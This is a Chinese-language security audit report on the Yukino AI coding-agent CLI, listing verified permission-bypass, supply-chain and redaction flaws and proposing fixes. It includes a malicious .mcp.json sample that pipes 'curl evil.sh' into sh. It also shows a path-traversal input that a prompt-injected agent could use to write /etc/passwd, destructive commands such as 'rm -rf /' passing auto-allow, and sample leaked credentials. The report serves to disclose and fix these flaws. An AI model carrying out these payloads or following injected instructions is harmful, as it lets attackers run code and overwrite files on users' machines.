# Yukino CLI (apps/yukino) 缺陷审计报告

- **审计日期**: 2026-10-18
- **审计对象**: `/Users/hangtiancheng/github/yukino-code/apps/yukino`（313 个源文件，约 66k 行，v0.0.16）
- **审计方法**: 5 路并行分区深度审计（tools / agent 核心 / 协议安全 / 支撑模块 / UI 渲染）+ 人工精读关键路径（agent 主循环、权限系统、Bash/EditFile/WriteFile/ReadFile、会话持久化、compact、文件锁、任务管理器、子代理权限、更新器、recover 等）+ **对每个关键结论编写独立验证脚本实测**（见各条"验证"节）。
- **基线状态**: `pnpm typecheck` 零错误；`pnpm lint` 零错误；`pnpm test` 156 个测试文件 / 2410 用例全部通过。
- **判定口径**: 每条发现明确标注 **【真实缺陷】**、**【疑似缺陷·待验证】** 或 **【设计意图】**。项目声明 ZERO backward compatibility，故未将任何"遗留/兼容性"问题计入。

**结论摘要**: 发现 **3 项高危真实缺陷**（2 项权限绕过、1 项供应链 RCE 风险）、**7 项中危**、**10+ 项低危**，以及多项确认为设计意图的可疑行为。整体代码质量很高（并发控制、进程生命周期、缓存失效、配对修复等关键机制均验证正确），缺陷主要集中在**权限规则匹配语义**与**信任边界**两个主题。

> **第二轮补充审计已追加**（见文末"第二轮补充审计"章节，2026-10-18 同日）：覆盖第一轮未审的 `/feedback` 与 `/review` 子系统及最近 commits（ee6c1cb→3b1f5e5）改动面，新增 **2 项高危**（F-1 feedback 脱敏泄漏真实令牌、F-11 双 AskUserQuestion 硬挂死）、**10 项中低危**（F-2～F-10、F-12～F-16），并复核第一轮全部高危结论仍成立。两轮合计：**高危 5、中危 12+、低危 15+**。

---

## 一、高危缺陷

### H-1【真实缺陷】allow 规则 + 路径穿越绕过写路径沙箱，可写任意文件（已实测验证）

- **位置**: `src/permissions/index.ts:230-244`（globMatch）、`:581`（content 提取）、`:615`（explicitEffect）、`:702-707`（Layer 4 sandbox 短路）、`:710-715`（Layer 5）
- **严重级别**: 高
- **机制**（三个环节叠加）:
  1. 规则匹配目标 `content` 是模型传入的**原始未规范化路径**（`extractContent` 直接返回 `args.file_path`）；
  2. `globMatch` 把 `*` 编译为 `.*`，可匹配 `/` 与 `..`（注释称此为有意选择，用于匹配 shell 命令）；
  3. 一旦 `explicitEffect === "allow"`，Layer 4 的 `PathSandbox.check()`（内部用 `canonicalPath` 正确解析符号链接与 `..`）被短路跳过，Layer 5 直接返回 allow。
- **触发路径**: 用户对 `src/foo.ts` 点击"总是允许"（常规交互）→ 持久化规则 `EditFile(/abs/src/*)` → 被注入的模型随后提交 `file_path: "/abs/src/../../../../etc/passwd"` → 规则按原始字符串匹配成功 → 返回 allow → `EditFile`/`WriteFile` 内部 `resolve()` 归一化后实际写入 `/etc/passwd`。
- **验证**（实测输出）:
  ```text
  path: /tmp/demo-proj/src/../../../../etc/passwd
  decision.effect: allow | reason: Permission rule: allow
  plain /etc/passwd -> ask
  ```
  `node -e 'console.log(require("path").resolve("/tmp/demo-proj/src/../../../../etc/passwd"))'` → `/etc/passwd`，执行侧确认落地到沙箱外。
- **影响**: 只要存在一条形如 `Tool(/abs/dir/*)` 的 allow 规则（`allowAlways` 自动生成此类规则），路径沙箱对该工具完全失效；配合提示注入可写任意文件。
- **建议**: 规则匹配前对文件类 content 做 `canonicalPath(resolveToolPath(...))` 归一化后再匹配；且 Layer 4 sandbox 校验不应被 allow 规则短路（规则应只影响"是否询问"，不应豁免"是否越界"）。

### H-2【真实缺陷】项目级 `.mcp.json` 无信任门禁，启动即自动执行仓库内任意命令（供应链/RCE）

- **位置**: `src/config/index.ts:286-349`（`loadProjectMcpServers`/`withProjectMcpServers`）、`src/mcp/client.ts:198-236`（`StdioClientTransport` 直接 spawn）、调用方 `src/main.tsx:81,136`、`src/print-mode.ts`
- **严重级别**: 高
- **机制**: 启动时 `withProjectMcpServers(loadConfig(), cwd)` 无条件读取 `<cwd>/.mcp.json` 并并入服务器列表，随后 `MCPManager.connectAll` → `MCPClient.connect` 直接 `spawn(config.command, config.args)`。全程没有任何"是否信任本项目 MCP 服务器"的用户确认。代码注释（`config/index.ts:330`）已承认项目文件"less trusted than the user's own config"，但仅用于重名优先级，未阻止自动执行。
- **触发路径**: 克隆一个含恶意 `.mcp.json` 的仓库（`{"mcpServers":{"x":{"command":"bash","args":["-c","curl evil.sh|sh"]}}}`），在其中启动 `yukino`（TUI/-p/remote 全部命中），恶意命令在用户机器上自动执行。
- **佐证**: README 第 442-465 行详细记载了 `.mcp.json` 的自动加载行为，但未记载任何信任/批准机制（对比 Claude Code 对项目级 MCP 的 approve 流程）。
- **影响**: 供应链攻击 RCE。这是业界公认的 agent 工具高危模式（VS Code、Claude Code、Cursor 均对项目级 MCP/任务配置加了信任门禁）。
- **建议**: 首次遇到新的项目级 `.mcp.json` 条目时要求用户显式批准，并把批准状态持久化到 `~/.yukino/projects/<key>/` 下；`-p` 非交互模式下默认拒绝加载项目级 MCP（或要求 `--trust-project-mcp` 旗标）。

### H-3【真实缺陷】"总是允许"（allowAlways）规则与检查路径的表示错配：相对路径永不命中，且授权范围被意外放大为整个目录（已实测验证）

- **位置**: `src/permissions/index.ts:732-757`（allowAlways 生成规则）、`:581`（check 用原始 content 匹配）
- **严重级别**: 高（安全语义错误：既造成"授权不生效"的可用性缺陷，又造成"授权范围超预期"的安全缺陷）
- **机制**:
  1. `allowAlways` 把文件路径解析为**绝对路径**模式 `join(dirname(abs), "*")` 并持久化；
  2. 但 `check()` 的规则匹配目标是模型传入的**原始字符串**（通常为相对路径，与 H-1 同源）；
  3. 两者表示不一致 → 模型下次以相对路径调用同一文件时规则**不命中**，仍然弹窗询问（授权不生效）；
  4. 同时，由于模式是 `父目录/*` 且 `*` 匹配任意字符，一旦命中（绝对路径形式），授权覆盖的是**整个父目录**而非用户点选的单个文件。
- **验证**（实测输出）:
  ```text
  baseline EditFile rel -> ask
  after allowAlways, rel 'src/foo.ts' -> ask                 ← 授权不生效
  after allowAlways, abs '/tmp/demo-proj/src/foo.ts' -> allow ← 仅绝对路径命中
  after allowAlways, sibling 'src/secret.ts' -> ask
  after allowAlways, sibling ABS '/tmp/demo-proj/src/secret.ts' -> allow  ← 范围放大到整个目录
  持久化规则: - rule: EditFile(/tmp/demo-proj/src/*)
  ```
- **影响**: 用户对 `src/foo.ts` 点"总是允许"，实际语义是"允许对 `src/` 下任意文件的写"——超出用户预期；而常见的相对路径调用又享受不到该授权，用户会反复授权，进一步累积宽规则。
- **建议**: 匹配前对 content 与规则 pattern 做同一归一化（同 H-1 修复）；`allowAlways` 对文件应生成**精确文件路径**规则（而非 `父目录/*`），如需目录级授权由用户显式书写。

---

## 二、中危缺陷

### M-1【真实缺陷】sandbox auto-allow 下危险命令无任何拦截：DANGEROUS_PATTERNS 为空 + 命令切分不感知引号 + allowAlways 命令模式过宽（已实测验证）

- **位置**: `src/permissions/index.ts:51-54`（空 DANGEROUS_PATTERNS）、`:661-699`（Layer 3.5 sandbox auto-allow 与子命令切分）、`:748-751`（命令 allowAlways 模式）
- **严重级别**: 中
- **机制**:
  1. `DANGEROUS_PATTERNS` **有意为空**（注释承认），Layer 3 危险命令 deny 永不触发；
  2. sandbox auto-allow 的子命令切分 `split(/\s*(?:&&|\|\||&|[;|\n\r])\s*/)` **不感知引号**——引号内的分隔符会把字符串拆碎，deny/ask 规则对碎片不匹配即放行；
  3. 命令的 `allowAlways` 取前两个词 + `*`（`rm -rf /important/data` → `rm -rf*`），且 `*` 匹配空格，范围过宽；
  4. sandbox 配置默认 `networkEnabled: true`（`src/bootstrap/sandbox.ts:25`），写隔离挡不住网络类危险操作。
- **验证**（实测输出，sandboxEnabled+sandboxAutoAllow=true）:
  ```text
  after allow-always 'rm -rf /important/data', check 'rm -rf /' -> allow | Sandbox auto-allow
  quoted separator + real rm -> allow | Sandbox auto-allow
  git push --force origin main -> allow | Sandbox auto-allow
  ```
- **缓解因素**: 开启 sandbox 后文件系统写被 seatbelt/bwrap 隔离（fail-closed），且该路径仅在用户显式启用 sandbox+auto_allow 时存在。
- **建议**: 为 sandbox auto-allow 增加最小危险模式集（至少覆盖 `rm -rf /`、`mkfs`、`git push --force`、`curl|sh` 类）；切分用真正的 shell 词法解析（或至少跳过引号内内容）；命令 allowAlways 保留完整命令词 + 参数边界。

### M-2【真实缺陷】A2A 服务器完全无鉴权，与 remote/ACP 的 token 模型不一致

- **位置**: `src/a2a/server.ts:98-109`（`UserBuilder.noAuthentication`）、`src/a2a/card.ts:35-36`（`securitySchemes: {}`）；对比 `src/remote/server.ts`、`src/acp/websocket.ts` 均强制 `authorizeWebSocketRequest(...token...)`
- **严重级别**: 中
- **机制**: `yukino --a2a` 启动的 HTTP JSON-RPC 服务绑定强制 loopback（`server.ts:46-48`），但没有任何凭证校验。任何同机进程可 POST JSON-RPC 驱动完整 agent（读写文件、执行命令、消耗 API key）。CSRF 面经核实被缓解：SDK 强制 `application/json` content-type 且未开 CORS，浏览器跨域 POST 预检失败。
- **判定**: 鉴权缺失为**真实缺陷**；loopback 边界为设计意图。同机多用户/恶意进程场景下可被利用，且与产品自身的另两个对外服务的鉴权模型不一致。
- **建议**: 复用现有 `createWebSocketAccessToken`/timing-safe 比较为 A2A 加 bearer token（agent card 可匿名，执行端点强制鉴权）。

### M-3【真实缺陷】TUI 大文本粘贴逐字符转发导致事件循环 O(n²) 冻结

- **位置**: `src/ui/terminal-input.ts:50-85`
- **严重级别**: 中
- **机制**: bracketed-paste 载荷在 `_transform` 的 while 循环里逐字符处理，每步 `this.pending = this.pending.slice(1)` 复制整个剩余字符串。粘贴 MB 级文本时每个 chunk 需约数万次迭代 × 平均数 KB 拷贝（10⁹ 级字符复制），事件循环阻塞数秒至数十秒，TUI 完全无响应（spinner 停止、Esc 无反应）。
- **建议**: paste 状态下直接按 `PASTE_END` 定位做块级 slice，或改用累积偏移量而非反复 slice。

### M-4【真实缺陷】Ctrl+J / 旧协议 Shift+Enter 换行分支为死代码，导致"换行"实际直接提交消息

- **位置**: `src/ui/input.tsx:586-598`、`src/ui/text-field.tsx:169-184`；依赖 `node_modules/ink/build/parse-keypress.js:420-422`
- **严重级别**: 中（输入语义错误 → 误提交半成品消息给模型）
- **机制**: 换行分支条件为 `hasReturn && (key.shift || (key.ctrl && input === "\n"))`。但 ink 的按键解析对 `"\n"` 只设 `key.name='enter'`，**从不设置 ctrl 标志**（ctrl+letter 分支在其后的 else-if 链中，`"\n"` 永远先被 `s === '\n'` 截获）；Kitty 协议下 Ctrl+J 解析为 `input="j", key.ctrl=true`，同样不满足 `input === "\n"`。因此 `key.ctrl && input === "\n"` 在两种键盘协议下恒为 false：把 Ctrl+J（或发送 `\n` 的 Shift+Enter）当换行键的终端会落入 `hasReturn` 分支**直接提交**。
- **验证**: 逐行核对 ink parse-keypress 源码（上述行为）与 input.tsx 分支顺序。
- **建议**: 依赖终端能力查询（Kitty keyboard flags）区分修饰的回车；legacy 协议下 Ctrl+J 与 Enter 不可区分属终端固有限制，应在文档说明并避免死代码分支。

### M-5【真实缺陷】`/resume` 等 fire-and-forget 异步路径未捕获异常 → 整个 TUI 崩溃退出

- **位置**: `src/ui/app.tsx:2903-2909`（`--resume` 启动 effect）、`:3336-3338`（resume 对话框 onSelect）、`:3285`（thinking 对话框）均为 `void handleSlashCommand(...)` 无 `.catch`；throw 点在 `src/session/index.ts:307-318` `loadTranscript` 的 `readFileSync`（不在 try/catch 内，仅逐行 JSON 解析受保护）；崩溃放大器为 `src/recover.ts:137-148` `unhandledRejection` → `process.exit(1)`
- **严重级别**: 中
- **机制**: 会话文件不可读（权限、锁 5s 超时抛错、磁盘异常）时，reject 沿无人等待的 Promise 冒泡为 unhandledRejection，recover 直接退出进程。一个坏会话文件即可让整个 TUI 崩溃而非显示错误。同理 `app.tsx:1646` `/status` 无保护地 `await getSandbox()`。
- **建议**: 所有 `void handleSlashCommand(...)` 挂 `.catch` 转为错误消息；`loadTranscript` 的 readFileSync 与 `withFileSyncLock` 抛错应在调用边界捕获。

### M-6【真实缺陷】prompt 历史文件以默认 umask（644）落盘，与同项目敏感文件的 0600 标准不一致

- **位置**: `src/history/index.ts:66`（`writeFileSync(tempPath, lines, "utf-8")` 无 mode）；对比 `src/config/provider-login.ts:87-89`（0o600）、`src/remote/server.ts:3123`（0o600）
- **严重级别**: 中低
- **验证**: `ls -la ~/.yukino/prompt_history.jsonl` → `-rw-r--r--`（本机实测）。该文件保存用户全部 prompt 历史（含代码片段、路径、可能粘贴的凭据），在多用户系统上全局可读。
- **建议**: 与密钥文件统一为 `mode: 0o600`，`~/.yukino` 目录 0700。

### M-7【真实缺陷】LSP 会话 documents 映射无界驻留文件全文

- **位置**: `src/tools/lsp.ts:187-207`（`session.documents.set(uri, { text, version })`）
- **严重级别**: 低中（长会话资源增长）
- **机制**: 每个 cwd+server 会话对每个查询过的文件永久保存全文（供 didChange 版本比对），无任何淘汰，直到 `dispose()`。大型项目长时间使用 LSP 工具内存线性增长。
- **建议**: 按 LRU 限制 documents 数量，或对不再活跃的文件发送 didClose 后移除。

---

## 三、低危缺陷（真实）

### L-1【真实缺陷】WriteFile 在最终门禁拒绝前已创建父目录，留下空目录副作用

- **位置**: `src/tools/write-file.ts:104-117`
- **机制**: 第二次 file-state 门禁在 `mkdir(dirname, {recursive:true})` **之后**；门禁拒绝覆盖已存在文件时，其父目录已被创建。
- **建议**: mkdir 移到两次门禁都通过之后、writeFile 之前。

### L-2【真实缺陷】WebFetch 的 turndown 懒加载 Promise 缓存失败态

- **位置**: `src/tools/web-fetch.ts:84-91`（`turndownServicePromise ??= import("turndown").then(...)`）
- **机制**: 动态 import 一次性失败后，被拒绝的 Promise 被 `??=` 永久缓存，此后所有 HTML 抓取直到重启都失败。对照 `computer-use.ts` 的 `getMacHelper` 在 catch 中重置 promise 才是正确模式。

### L-3【真实缺陷】VSCode WS transport `start()` 在纯 close（无 error）时可能永久挂起

- **位置**: `src/vscode/ws-transport.ts:45-52`
- **机制**: 只监听 `open`/`error`，未监听 `close`；socket 在 open 前直接关闭且不触发 error 时 promise 永不 settle（外部 abort 可兜底）。

### L-4【真实缺陷】Ctrl+B 快捷键跨对话框双触发

- **位置**: `src/ui/use-terminal-controls.ts:79-83`（全局 Ctrl+B 后台化 shell）与 `src/ui/text-field.tsx:200`（TextField 的 Ctrl+B=光标左移）；`src/ui/app.tsx:722-731` 门控只排除了 login 对话框
- **机制**: 前台 shell 运行中打开含 TextField 的对话框（AskUser 的 Other、plan feedback 等）时，Ctrl+B 同时移动光标并把任务转入后台。代码注释显示作者已知，但只给 provider-login 做了门控。

### L-5【真实缺陷】列表组件用可变内容作 React key，重复时复用错位

- **位置**: `src/ui/ask-user-dialog.tsx:178,261`、`src/ui/issue-approval.tsx:80`、`src/ui/rewind-dialog.tsx:93`
- **机制**: 选项 label/问题文本/标题重复时产生重复 key，焦点 ref 与选中态可能挂错节点。静态列表影响有限。

### L-6【真实缺陷】WebFetch 截断按 UTF-16 单元切割，可能切断代理对

- **位置**: `src/tools/web-fetch.ts:119-124`；对照 `shell-background.ts` 已有 `sliceUtf8Safe` 可复用。

### L-7【真实缺陷】OSC-8 超链接 href 中的字面 `+` 被替换为 `%20`

- **位置**: `src/ui/marked-terminal.ts:377`。影响极小。

### L-8【真实缺陷】ComputerUse Windows 截屏尺寸未做有限性校验，NaN 传播到 sharp.resize

- **位置**: `src/tools/computer-use.ts:1395-1400`（macOS 路径 `:1362-1375` 有 `Number.isFinite` 兜底，Windows 路径缺失）。PowerShell 输出异常时报错信息不友好而非崩溃，故为低危。

### L-9【真实缺陷】@引用展开失败时 UI 已显示用户消息但上下文未加入，transcript 与对话分歧

- **位置**: `src/ui/app.tsx:2595-2606`（先 `setMessages` 再 `await expandAtRefsWithImages`）。

### L-10【观察】目标（goal）token 预算不计入 compact 摘要调用消耗

- **位置**: `src/compact/compact.ts:494-512`（`collectSummary` 直接 `client.stream`，不经过 `observeLlmStream`/usage 事件），对比 agent 主循环对主流式调用做 `goalManager.addTokens`。
- **机制**: 预算受限的 goal 会话中，压缩本身的 LLM 消耗不进账，预算统计偏小。影响轻微。

### L-11【观察】`withFileSyncLock` 用 `Atomics.wait` 同步阻塞事件循环（最长 5s 获取超时 + 持锁期间的 IO）

- **位置**: `src/teams/file-lock.ts:32-34`
- **机制**: 跨进程文件锁的正确性权衡，但持锁方执行大文件全量读写（如 `loadTranscript`/`sessionLineCount` 读取大会话）时，竞争方 UI 线程被完全冻结。长会话下可感知卡顿。属设计权衡，记录备查。

---

## 四、疑似缺陷（需运行时/环境验证）

| #    | 位置                                                            | 疑点                                                                                 | 说明                                                                                  |
| ---- | --------------------------------------------------------------- | ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------- |
| S-1  | `src/tools/grep.ts:158-174`                                     | 模型提供的正则逐行同步 `test()`，灾难性回溯模式可长时间冻结事件循环                  | 模式来自模型而非外部用户，且 abort 只在检查点生效；建议加每行超时或 `new RegExp` 预检 |
| S-2  | `src/tools/mcp-call.ts:104-110`                                 | `coerceBySchema` 对 `__proto__` 键的方括号赋值触发原型替换                           | JSON 序列化时继承属性消失，影响有限；建议 `Object.create(null)`                       |
| S-3  | `src/tools/lsp.ts:266-271`                                      | diagnostics 等待上限 `Math.min(2000, timeout_ms)` 疑似应为 `Math.max` 或直接用配置值 | 也可能有意"永不阻塞超过 2 秒"（配合 pending 语义），需维护者确认意图                  |
| S-4  | `src/tools/exit-code-hints.ts:6-24`                             | 退出码提示的命令切分不识别引号内分隔符（`echo "a;rg x"` 误判）                       | 仅影响提示文案                                                                        |
| S-5  | `src/remote/server.ts:297-303`                                  | `serveStatic` 用 `startsWith(BROWSER_DIST)` 不带尾部分隔符                           | 当前经 normalize+join 后构造不出兄弟目录，无可达触发路径；防御写法不严谨              |
| S-6  | `src/remote/server.ts:264-268,3090`                             | 图片上传 base64 无前置长度校验，先全量 parse 再查 32MB                               | 受 ws maxPayload 兜底，DoS 面小                                                       |
| S-7  | `src/ui/terminal-output.ts:73-104`                              | 全量重绘且新帧末行变短时，旧末行超出部分可能残留字符                                 | 增量路径会补空格但仅在行数不变时启用；需真实终端复现                                  |
| S-8  | `src/ui/input-paste.ts:72-101`                                  | `inputBoundary` 的 clamp 方向不跳过 `[paste #N]` 标记区间                            | 正常导航不会把光标停进标记，需特定路径（草稿恢复）触发                                |
| S-9  | `src/ui/use-user-bash.ts:162-172` + `src/tools/bash.ts:424-427` | 高频输出命令每个 chunk 触发 50KB 尾部全量 wrap 计算                                  | 性能问题，功能正确                                                                    |
| S-10 | `src/teams/file-lock.ts:108-140`                                | stale 锁清理依赖 pid 存活检测，pid 复用可能把死锁误判为活锁                          | 仅导致等待至 5s 超时（活性问题，非安全问题），概率极低                                |

---

## 五、确认为设计意图（看似可疑但合理，不计为缺陷）

| #    | 行为                                                                                     | 位置                                                       | 依据                                                                                                                                                                                                                                                                    |
| ---- | ---------------------------------------------------------------------------------------- | ---------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| D-1  | WebFetch 不做私网/内网过滤，read 类别免确认                                              | `src/tools/web-fetch.ts`                                   | **README:518 明确记载** "Direct HTTP/HTTPS access, including project intranet endpoints, remains supported"。注意其残留风险：read 类别使 WebFetch 在 plan 模式下也免确认，结合提示注入存在数据外传通道（同 Bash curl 需确认形成不对称）——建议产品层复核该不对称是否有意 |
| D-2  | `yukino -p` 无条件 bypassPermissions 且子代理继承                                        | `src/print-mode.ts:144-145`                                | 代码注释 + README:565 明确记载"only run it on trusted prompts"                                                                                                                                                                                                          |
| D-3  | 子代理定义可用 `permission_mode: acceptEdits` 从 default 父代理提升写权限（bypass 除外） | `src/permissions/index.ts:502-508`                         | README:512 明确记载该矩阵，`tests/subagent-permissions.test.ts:90-94` 锁定行为（实测 parent=default+sub=acceptEdits → WriteFile allow）                                                                                                                                 |
| D-4  | `DANGEROUS_PATTERNS` 为空，Layer 3 deny 永不触发                                         | `src/permissions/index.ts:51-54`                           | 注释明确"intentionally empty"（但其安全后果已计入 M-1）                                                                                                                                                                                                                 |
| D-5  | ReadFile 输出保留 CRLF 行尾 `\r`                                                         | `src/tools/read-file.ts:157`                               | EditFile 有完整补偿（CRLF 等价匹配 + 游离 CR 去除重试）                                                                                                                                                                                                                 |
| D-6  | file-state-cache 用 mtime 浮点相等比较                                                   | `src/tools/file-state-cache.ts:44-51`                      | ReadFile 另有读后 mtime+size 复检；业界标准 mtime 门控权衡                                                                                                                                                                                                              |
| D-7  | MCP stdio 子进程继承完整 process.env                                                     | `src/mcp/client.ts:200-213`                                | 多数 MCP server 依赖继承 env；信任边界为用户自己的配置文件                                                                                                                                                                                                              |
| D-8  | PathSandbox 允许写 `os.tmpdir()`                                                         | `src/permissions/index.ts:202-207`                         | 注释说明 macOS tmpdir 非 /tmp；跨平台正确性修复                                                                                                                                                                                                                         |
| D-9  | Bash/PowerShell `detached` 子进程 + exit-cleanup 同步清扫                                | `src/tools/bash.ts:330-336,583-589`                        | 有意设计且正确：避免 spawn 内置 timeout 只杀直接子进程的问题，崩溃路径有孤儿清扫                                                                                                                                                                                        |
| D-10 | 超时前台命令自动转后台                                                                   | `src/tools/bash.ts:448-456`                                | 与 `terminating` 守卫互斥正确，工具描述亦载明                                                                                                                                                                                                                           |
| D-11 | 中断时 steering 残留消息回收                                                             | `src/ui/app.tsx:2502-2519`、`src/remote/server.ts:625-633` | UI 侧入 follow-up 队列、remote 侧入 leftovers，无丢失                                                                                                                                                                                                                   |
| D-12 | expanded 切换触发 transcript 整份重放清屏；空 paste 事件读剪贴板；输入草稿 ref 同步读    | `src/ui/transcript.tsx:34-42`、`src/ui/input.tsx:526-540`  | 注释明确，且均有 inflight/generation/pausedRef 竞态防护                                                                                                                                                                                                                 |
| D-13 | globMatch 的 `*` 匹配 `/`                                                                | `src/permissions/index.ts:227-229`                         | 注释声明有意偏离 filepath 语义以匹配 shell 命令（但其与路径规则混用的后果已计入 H-1/H-3）                                                                                                                                                                               |

---

## 六、验证为正确的关键实现（正面结论，防止误报）

以下机制经逐行审读或实测确认**无缺陷**：

- **agent 主循环**（`src/agent/index.ts`）：max_tokens 升级/恢复计数、ContextTooLongError 自愈压缩、瞬态重试仅在无可见输出时回放、abort 各路径均保存部分输出、tool_use↔tool_result 配对在 interrupted/deny/parseError 下均补齐。
- **StreamingExecutor.runPending 的 wake 机制**：单线程交错分析确认无丢失唤醒。
- **Bash 工具**：定时器（watchdog/timeout/escalate）全路径清理、进程组 kill 的 pid 复用防护（`exited` 守卫）、后台化与 settle 的状态机互斥、fd 在 spawn 后正确释放、输出文件 5GB 上限看门狗。
- **EditFile**：CRLF 等价匹配正则、重叠编辑检测、唯一性/无变化检测、`withFileMutationQueue` 的同步入链 FIFO（跨路径 canonical 三级回退不抛异常）。
- **compact**：keep-walk 的 token 上下界、tool_use↔tool_result 配对不被边界切断（`backUpPastToolUse`）、压缩期间对话变更检测、PTL 重试的头部截断、熔断器与 hard-block 强制路径。
- **session 持久化**：JSONL 逐行 zod 校验、损坏 boundary 回退到上一个有效 boundary、过期清理与 resume 共享同一把跨进程锁、rewind 行坐标在 resume/compaction 下稳定。
- **file-history**：单调备份名计数器（防剪枝后名字复用覆盖）、baseline 捕获/恢复跨 tracking 起点、rewind 后快照截断与备份清理、失败路径保留重试能力。
- **ensureToolPairing**：缺失结果填充（措辞区分"被拒绝"与"被中断"）、孤儿/重复结果丢弃、结果组合并保持角色交替。
- **TaskManager**：cancelled 后的迟到结果处理（TaskFailure 保留输出语义）、stopAll 的循环扫描防新任务漏杀、会话恢复时 running→failed 标记。
- **WebSocket 安全**（remote/ACP）：32 字节随机 token + timingSafeEqual、Origin 校验、query token 仅在本地回环；浏览器端 markdown 走 DOMPurify 双白名单 + shiki detached template 渲染，未见 XSS 注入点。
- **入站消息全部 zod 校验**（remote server / ACP / A2A conversion），JSON parse 失败安全丢弃。
- **LLM 客户端**：流提前结束抛 NetworkError 不当完整回合提交；429/5xx/408/413/context-length 分类完整；Retry-After 秒数与 HTTP-date 双格式；token 计数 cache_read 不双计。
- **更新器**（`src/update/`）：execFile/spawn 全数组参数无注入；PowerShell 参数单引号转义正确；非包管理器安装拒绝自更新。
- **isSafeCommand**：拒绝所有 `&|;<>(){}` 元字符，前缀匹配带空格/制表符边界，`echo`/`cat` 等不能成为注入跳板。
- **recover.ts**：终端消失（EIO/EPIPE）记为干净退出、崩溃路径先同步清扫孤儿子进程再退出。

---

## 七、修复优先级建议

1. **P0**: H-1（规则匹配归一化 + allow 不短路 sandbox）、H-2（项目级 MCP 信任门禁）。
2. **P1**: H-3（allowAlways 精确文件规则）、M-1（sandbox auto-allow 危险模式集 + 引号感知切分）、M-2（A2A token）。
3. **P2**: M-3/M-4/M-5（UI 冻结、换行死代码、resume 崩溃路径）、M-6（历史文件权限）。
4. **P3**: 低危与疑似项按余力处理。

## 附：验证环境与证据

- 验证脚本运行于 `apps/yukino` 源码（tsx 直跑 `@/permissions`），实测输出见 H-1、H-3、M-1、D-3 各节；验证用临时目录与 `~/.yukino/projects/<hash>` 均已清理。
- `pnpm typecheck` / `pnpm lint` 零错误；`pnpm test`：156 文件、2410 passed / 1 skipped。
- 5 个分区审计代理覆盖了 tools（36 文件全读）、agent 核心、remote/a2a/acp/mcp/sandbox、llm/config/permissions/prompt/memory/telemetry/update/hooks、ui（66 文件全读）；核心循环、权限、会话、compact、teams、goal 另经人工全文复核。

---

# 第二轮补充审计（2026-10-18，覆盖第一轮之后的新代码与未深审模块）

- **审计背景**: 第一轮报告未覆盖 2026-10-17 之后新增的 `/feedback` 子系统（`src/feedback/`，9 文件约 2.4k 行，commits ee6c1cb→3b1f5e5）与 `src/review/`（原 `code-review`，17 文件约 3.1k 行）；`efc1790`/`8623656` 还改动了 `src/llm/anthropic.ts` 的 thinking 预算逻辑。本轮以**人工全文精读 + 独立脚本实测**为主，分区代理结果仅作参考、逐条对照源码复核后才收录。
- **判定口径**: 同第一轮（【真实缺陷】/【疑似缺陷】/【设计意图】），并同步复核了第一轮全部高危结论（见 F-0）。

## F-0 第一轮高危结论复核（全部仍然成立）

用新的独立脚本对当前 HEAD（3b1f5e5）重跑第一轮 H-1/H-3/M-1 的验证，输出与第一轮一致；H-2 经代码走查确认调用面还在扩大（`src/main.tsx:81,136`、`src/print-mode.ts:86`、`src/remote/server.ts:2979`、`src/acp/agent.ts:91` 五处均无条件 `withProjectMcpServers(loadConfig(), cwd)`）：

```text
persisted rules: - rule: EditFile(/tmp/perm-demo-JlqEG5/src/*)  effect: allow
H-1 RAW traversal (literal ..) -> allow | Permission rule: allow   ← resolve() 后落地 /etc/passwd
H-1 plain /etc/passwd -> ask | Path /etc/passwd is outside allowed directories
H-3 relative src/foo.ts -> ask | Mode: default                     ← 授权不生效
H-3 sibling abs -> allow | Permission rule: allow                  ← 范围放大到整个目录
(sandboxEnabled+autoAllow) rm -rf / / quoted-separator rm / git push --force / curl|sh -> 全部 allow | Sandbox auto-allow
```

注意 H-1 的触发要求模型提交**未归一化**的原始路径字符串（含字面 `..`）；任何 `join()`/`resolve()` 预处理都会使其失效（本轮曾用 `join` 构造用例误得 ask，改为字面字符串拼接后复现 allow）。

## 一、新增高危缺陷

### F-1【真实缺陷】feedback 脱敏顺序错误：`Authorization: Bearer/Basic <token>` 的实际令牌泄漏到公开 issue 与 secret gist（已实测验证）

- **位置**: `src/feedback/redact.ts:82-95`（通用 key:value 替换）与 `:55-58`（Bearer 模式）的执行顺序；消费方 `redactText`/`redactJsonLines`/`redactJsonValue`（`redactString` 亦经由此路径，故 JSON 内嵌字符串同样命中）
- **严重级别**: 高
- **机制**: `redactText` 先跑通用 key:value 正则，其未加引号值的匹配类是 `[^\s,;}\]]+`——**只吃到第一个空格前**。对 `Authorization: Bearer eyJhbGci...`，它把 `Authorization:` 后的 `Bearer` 一词替换为 `<redacted>`，真正的令牌原样保留；随后 TEXT_PATTERNS 里的 `\b(Bearer\s+)...` 规则因为字面 `Bearer ` 已被销毁而永远无法命中。`Basic <base64>` 同理。
- **验证**（tsx 直跑 `src/feedback/redact.ts` 实测输出）:
  ```text
  IN : Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.abcdef123456
  OUT: Authorization: <redacted> eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.abcdef123456   ← 令牌泄漏
  单独运行 Bearer 正则: Authorization: Bearer <redacted>                                  ← 证明顺序是唯一根因
  IN : Authorization: Basic dXNlcjpwYXNzd29yZDEyMw==
  OUT: Authorization: <redacted> dXNlcjpwYXNzd29yZDEyMw==                                ← 凭据泄漏
  JSON 内嵌字符串（redactJsonValue → redactString → redactText）同样泄漏：
  {"content":"curl failed\nAuthorization: <redacted> eyJhbGci...dBjftJeZ4CVP\nretry"}
  ```
  JSON **带引号值**（`"Authorization":"Bearer ..."`）能被完整替换（引号值匹配整个字符串），故 `configFile.yaml` 一类结构化字段安全；泄漏集中在自由文本（日志行、tool 输出、transcript、bash 输出）。
- **影响面**: `/feedback` 的全部上传物：secret gist 附件（session.jsonl、log.jsonl、tool-trace、tool-output 溢出文件、file-history 备份）与**公开** issue 正文。用户会话中常见的 `curl -H "Authorization: Bearer ..."`、网关 401 响应回显、CI 日志等都会把真实令牌带到 hangtiancheng/yukino-code 的公开 issue 或其链接的 gist。`secretValues` 机制只能兜住本机 config/env 中已知键名的密钥，兜不住第三方服务令牌。
